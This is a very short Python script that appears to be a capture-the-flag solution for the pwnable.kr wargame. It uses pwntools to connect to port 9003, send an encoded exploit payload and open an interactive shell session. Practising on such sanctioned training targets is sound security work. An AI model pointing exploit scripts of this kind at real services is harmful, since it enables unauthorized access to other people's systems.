import pwn
from struct import pack

s = pwn.tubes.remote.remote('pwnable.kr',9003)
s.sendline('hJIECISSBAhA6xEI')

s.interactive()
